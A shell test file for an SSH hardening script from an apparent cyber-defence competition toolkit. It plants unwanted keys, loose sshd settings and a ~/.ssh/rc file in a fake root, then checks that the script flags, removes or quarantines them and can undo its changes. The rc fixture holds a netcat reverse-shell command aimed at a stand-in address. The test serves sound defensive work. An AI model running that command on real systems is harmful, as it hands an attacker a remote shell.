#!/bin/sh
# Tests for roles/linux/LX-22-ssh-hardening.sh.
# Works on a fake root (--root) with a stand-in sshd ("sshd -t -f FILE"
# passes unless SSHD_REJECT=1), so the real SSH server is never touched.
# Keys are made with ssh-keygen when it exists.  Checks: dry run changes
# nothing; --apply keeps team keys and removes the rest (evidence kept),
# also in a service account's home; the settings block goes on top; rc files
# are quarantined; a protected account keeps its keys; a config sshd rejects
# is never installed; undo restores the files; a second run changes nothing.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/linux/LX-22-ssh-hardening.sh"
export CCDC_SKIP_VERIFY=1
# shellcheck disable=SC2086
run() { $SH "$C" "$@"; }
O="$T_TMP/out"; R="$T_TMP/root"; B="$T_TMP/bin"; K="$T_TMP/keys"
mkdir -p "$O" "$B" "$K"
cat >"$B/sshd" <<'STUB'
#!/bin/sh
# stand-in sshd: -t passes unless SSHD_REJECT=1
[ "$1" = -t ] || exit 1
[ "${SSHD_REJECT:-0}" = 1 ] && { echo "Bad configuration option: Planted" >&2; exit 255; }
exit 0
STUB
chmod +x "$B/sshd"
CCDC_SSHD="$B/sshd"; export CCDC_SSHD

if ! command -v ssh-keygen >/dev/null 2>&1; then
    t_start "ssh-keygen missing: LX-22 key tests skipped"
    t_done; exit 0
fi
for k in team evil www; do ssh-keygen -q -t ed25519 -N '' -C "$k" -f "$K/$k"; done

plant() {
    rm -rf "$R"; mkdir -p "$R/etc/ssh" "$R/home/alice/.ssh" "$R/home/bob/.ssh" "$R/var/www/.ssh"
    printf 'root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nbob:x:1001:1001::/home/bob:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n' >"$R/etc/passwd"
    # root has no usable password here, so key-only root login is safe.
    printf 'root:*:19000:0:99999:7:::\nalice:$6$a$b:19000:0:99999:7:::\n' >"$R/etc/shadow"
    printf 'Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nX11Forwarding yes\nPermitRootLogin yes\nMatch User bob\n    PermitEmptyPasswords yes\n' >"$R/etc/ssh/sshd_config"
    { echo '# alice keys'; cat "$K/team.pub"; cat "$K/evil.pub"; } >"$R/home/alice/.ssh/authorized_keys"
    cat "$K/evil.pub" >"$R/home/bob/.ssh/authorized_keys"
    { printf 'command="/tmp/x" '; cat "$K/www.pub"; } >"$R/var/www/.ssh/authorized_keys"
    printf 'nc -e /bin/sh 10.6.6.6 4444\n' >"$R/home/alice/.ssh/rc"
    cp "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
    cp "$R/home/alice/.ssh/authorized_keys" "$T_TMP/alice_keys.orig"
}
printf 'type,value,note\naccount,bob,scoring logs in with a key\n' >"$T_TMP/protected.csv"

# blk -> only the CCDC block at the top of sshd_config.
blk() { awk '{ print } /^# <<< CCDC LX-22/ { exit }' "$R/etc/ssh/sshd_config"; }   # awk regex: posix-ok
rundir() { printf '%s\n' "$1" | sed -n 's/^All results: //p' | tail -n 1; }

t_start "options"
run --allow-keys "$K/team.pub" --remove-all-keys >/dev/null 2>&1; t_eq "$?" 2 "--allow-keys with --remove-all-keys exits 2"
run --allow-keys "$T_TMP/none.pub" >/dev/null 2>&1; t_eq "$?" 2 "missing allow file exits 2"
run --root-login maybe >/dev/null 2>&1; t_eq "$?" 2 "bad --root-login exits 2"
run --set x11=perhaps >/dev/null 2>&1; t_eq "$?" 2 "bad --set answer exits 2"
run --set nope=yes >/dev/null 2>&1; t_eq "$?" 2 "unknown --set setting exits 2"

t_start "look and plan: every key and setting shown, nothing changed"
plant
out=$(run --out "$O" --root "$R" --no-color 2>&1); rc=$?
t_eq "$rc" 0 "exit 0"
d=$(rundir "$out")
t_ok "sshd_config unchanged" cmp -s "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
t_ok "keys unchanged" cmp -s "$R/home/alice/.ssh/authorized_keys" "$T_TMP/alice_keys.orig"
t_has "$out" "1/5  how SSH is set up now" "section: SSH now"
t_has "$out" "a Match block [Match User bob] changes PermitEmptyPasswords" "loosening Match block reported"
t_has "$out" "/home/alice/.ssh/rc runs at every SSH login" "rc file reported"
t_has "$out" "key #1  alice" "keys are numbered and named"
t_has "$out" "$(ssh-keygen -l -f "$K/team.pub" | awk '{ print $2 }')" "with their fingerprint"
t_has "$out" "has a forced command or environment" "forced-command key called out"
t_ok "the www-data key is marked planted" grep -q '"www-data",.*"planted"' "$d/csv/keys.csv"
t_has "$out" "Keep key #4 (www-data" "asks about each key"
t_has "$out" "Turn OFF X11 forwarding? (now: yes)" "asks about each setting, showing the current value"
t_has "$out" "Graphical forwarding: not needed on a server" "with a plain explanation"
t_has "$out" "[ok] PermitUserEnvironment is already no" "settings already right are not asked"
t_has "$out" "Allow root to log in over SSH? (now:" "asks about root login"
t_has "$out" "[y/n/K/l] k (default): key-only, root needs an SSH key; passwords are refused" "a batch run shows the default answer and what it means"
t_has "$out" "Turn OFF X11 forwarding? (now: yes) [Y/n] y (default): yes, set X11Forwarding no" "yes/no answers say what they do"
t_has "$out" "Turn OFF password logins (key only)? (now: yes)" "asks about password logins"
t_has "$out" "[~] X11Forwarding: yes -> no" "the plan shows each change"
t_has "$out" "the new config passed sshd -t" "the config is tested first"
t_has "$out" "Dry run: nothing was changed" "and says nothing was changed"
for f in output.txt summary.txt keys.txt settings.txt csv/keys.csv csv/settings.csv run.txt; do t_file "$d/$f" "$f written"; done
t_has "$d" "ssh-hardening-" "numbered run folder"
t_fail "output.txt has no colour codes" grep -q "$(printf '\033')" "$d/output.txt"

t_start "--apply --batch: recommended answers"
out=$(run --out "$O" --root "$R" --protected "$T_TMP/protected.csv" --apply --batch --no-color 2>&1); rc=$?
t_eq "$rc" 0 "exit 0"
cfg=$(cat "$R/etc/ssh/sshd_config")
t_eq "$(head -n 1 "$R/etc/ssh/sshd_config")" "# >>> CCDC LX-22 (sshd uses the first value it reads, so this block wins)" "block is at the top"
for k in "PermitEmptyPasswords no" "X11Forwarding no" "AllowAgentForwarding no" "MaxAuthTries 4" "LoginGraceTime 30" "ClientAliveInterval 300" "LogLevel VERBOSE" "PermitRootLogin prohibit-password"; do
    t_has "$cfg" "$k" "$k"
done
t_hasnt "$cfg" "PasswordAuthentication no" "password logins left on by default"
t_hasnt "$cfg" "AllowTcpForwarding no" "forwarding left on by default"
t_hasnt "$cfg" "Ciphers " "crypto left alone by default"
t_has "$cfg" "X11Forwarding yes" "original lines kept below the block"
ak=$(cat "$R/home/alice/.ssh/authorized_keys")
t_has "$ak" "$(cut -d' ' -f2 "$K/team.pub")" "a normal key is kept by default"
t_hasnt "$(cat "$R/var/www/.ssh/authorized_keys")" "$(cut -d' ' -f2 "$K/www.pub")" "the forced-command key on www-data is removed by default"
ev=$(find "$O" -name 'authorized_keys.removed' -path '*var/www*' | head -n 1)
t_has "$(cat "$ev" 2>/dev/null)" "$(cut -d' ' -f2 "$K/www.pub")" "removed key kept as evidence"
t_fail ".ssh/rc quarantined" test -e "$R/home/alice/.ssh/rc"
t_has "$out" "not reloaded (--no-reload or --root)" "no reload with --root"

t_start "a second run changes nothing"
out=$(run --out "$O" --root "$R" --protected "$T_TMP/protected.csv" --apply --batch --no-color 2>&1)
t_has "$out" "Nothing to change" "nothing to change"
t_eq "$(grep -c 'CCDC LX-22' "$R/etc/ssh/sshd_config")" 2 "only one block"

t_start "--allow-keys keeps only the team's keys; a protected account keeps its own"
plant
out=$(run --out "$O" --root "$R" --allow-keys "$K/team.pub" --protected "$T_TMP/protected.csv" --apply --batch --no-color 2>&1)
ak=$(cat "$R/home/alice/.ssh/authorized_keys")
t_has "$ak" "$(cut -d' ' -f2 "$K/team.pub")" "team key kept"
t_hasnt "$ak" "$(cut -d' ' -f2 "$K/evil.pub")" "planted key removed"
t_has "$ak" "# alice keys" "comment lines kept"
t_has "$(cat "$R/home/bob/.ssh/authorized_keys")" "$(cut -d' ' -f2 "$K/evil.pub")" "protected account keeps its keys"
t_hasnt "$out" "Keep key #" "no key questions with --allow-keys"

t_start "undo"
U=$(ls "$O"/undo-*.log | tail -n 1)
awk -F'\t' '{ l[NR] = $4 } END { for (i = NR; i >= 1; i--) print l[i] }' "$U" >"$T_TMP/undo.sh"
sh "$T_TMP/undo.sh" >/dev/null 2>&1
t_ok "sshd_config restored" cmp -s "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
t_ok "authorized_keys restored" cmp -s "$R/home/alice/.ssh/authorized_keys" "$T_TMP/alice_keys.orig"
t_file "$R/home/alice/.ssh/rc" "rc file put back"

t_start "a config sshd rejects is never installed"
plant
out=$(SSHD_REJECT=1; export SSHD_REJECT; run --out "$O" --root "$R" --apply --batch --no-protected --no-color 2>&1); rc=$?
t_eq "$rc" 5 "exit 5"
t_ok "sshd_config unchanged" cmp -s "$R/etc/ssh/sshd_config" "$T_TMP/sshd_config.orig"
t_has "$out" "sshd -t rejected the new config" "says why"

t_start "flags answer the questions"
plant
run --out "$O" --root "$R" --apply --batch --protected "$T_TMP/protected.csv" --root-login no --no-forwarding --no-passwords --strong-crypto --allow-users alice --remove-all-keys --set x11=no --set loglevel=no >/dev/null 2>&1
cfg=$(cat "$R/etc/ssh/sshd_config")
t_has "$cfg" "PermitRootLogin no" "--root-login no"
t_has "$cfg" "AllowTcpForwarding no" "--no-forwarding"
t_has "$cfg" "PasswordAuthentication no" "--no-passwords"
t_has "$cfg" "Ciphers chacha20" "--strong-crypto"
t_has "$cfg" "AllowUsers alice bob" "--allow-users adds the protected account"
t_eq "$(grep -c . "$R/home/alice/.ssh/authorized_keys")" 1 "--remove-all-keys leaves only the comment"
t_hasnt "$(blk)" "X11Forwarding" "--set x11=no leaves X11 alone"
t_hasnt "$cfg" "LogLevel VERBOSE" "--set loglevel=no"

t_start "root login is not taken away when it is root's only way in, or scored"
plant
printf 'root:$6$a$roothash:19000:0:99999:7:::\n' >"$R/etc/shadow"
out=$(run --out "$O" --root "$R" --apply --batch --no-protected --no-color 2>&1)
t_hasnt "$(blk)" "PermitRootLogin" "root with a password and no key: root login left alone"
t_has "$out" "key-only would lock root out of SSH: the default is l (leave)" "and it says why"
t_has "$(cat "$R/etc/ssh/sshd_config")" "PermitEmptyPasswords no" "the other settings still go in"
plant
printf 'root:$6$a$roothash:19000:0:99999:7:::\n' >"$R/etc/shadow"
mkdir -p "$R/root/.ssh"; cat "$K/team.pub" >"$R/root/.ssh/authorized_keys"
run --out "$O" --root "$R" --apply --batch --no-protected >/dev/null 2>&1
t_has "$(cat "$R/etc/ssh/sshd_config")" "PermitRootLogin prohibit-password" "root with a key that stays gets key-only login"
plant
printf 'type,value,note\naccount,root,scoring logs in as root\n' >"$T_TMP/prot-root.csv"
out=$(run --out "$O" --root "$R" --apply --batch --protected "$T_TMP/prot-root.csv" --root-login no --no-color 2>&1)
t_hasnt "$(cat "$R/etc/ssh/sshd_config")" "PermitRootLogin no" "a protected root keeps its login even with --root-login no"
t_has "$out" "root is on the protected list" "and it says so"

if command -v script >/dev/null 2>&1 && script -qc true /dev/null >/dev/null 2>&1; then
    t_start "questions in a terminal"
    plant
    # keys #1-#4: Enter, n (evil), Enter, Enter (www: default no); rc file: Enter (yes); root login: no
    # x11: n; agent, maxauth, grace, alive, loglevel: Enter; passwords: Enter; forwarding: y;
    # crypto: Enter; allowusers: Enter; apply: Enter.  (emptypw, rhosts, userenv are already right.)
    printf '\nn\n\n\n\nno\nn\n\n\n\n\n\n\ny\n\n\n\n' >"$T_TMP/ans"
    CCDC_NO_TTY=0 script -qc "$SH $C --out $O --root $R --no-color --no-protected --apply --no-timer" /dev/null <"$T_TMP/ans" >"$T_TMP/tty.out" 2>&1
    tt=$(cat "$T_TMP/tty.out")
    t_has "$tt" "Apply these" "asks before applying"
    t_has "$tt" "[y] yes, with a password or a key" "root question lists y"
    t_has "$tt" "[n] no, root cannot log in over SSH at all" "root question lists n"
    t_has "$tt" "[k] key-only, root needs an SSH key" "root question lists k"
    t_has "$tt" "[l] leave it as it is" "root question lists l"
    t_has "$tt" "Answer [y/n/K/l]:" "and says which letters it takes, default in capitals"
    t_has "$tt" "[y] yes, keep it" "key questions say what y does"
    t_has "$tt" "[n] no, remove it" "and what n does"
    cfg=$(cat "$R/etc/ssh/sshd_config")
    t_has "$cfg" "PermitRootLogin no" "typed root answer used"
    t_hasnt "$(blk)" "X11Forwarding" "'n' to X11 respected"
    t_has "$cfg" "AllowTcpForwarding no" "'y' to forwarding respected"
    t_hasnt "$(cat "$R/home/alice/.ssh/authorized_keys")" "$(cut -d' ' -f2 "$K/evil.pub")" "'n' to a key removes it"
    # A wrong answer is asked again; a letter works.  Root question: zz, then k.
    plant
    printf '\n\n\n\n\nzz\nk\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n' >"$T_TMP/ans2"
    CCDC_NO_TTY=0 script -qc "$SH $C --out $O --root $R --no-color --no-protected --apply --no-timer" /dev/null <"$T_TMP/ans2" >"$T_TMP/tty2.out" 2>&1
    t_has "$(cat "$T_TMP/tty2.out")" '"zz" is not an answer here: type one of [y/n/K/l]' "a wrong answer is refused and asked again"
    cp "$T_TMP/tty2.out" /tmp/claude-0/-home-claude/3ffb2eda-5138-5d3e-9f99-6d28bba8f70e/scratchpad/tty2.out
    t_has "$(blk)" "PermitRootLogin prohibit-password" "'k' means key-only"
fi
t_done
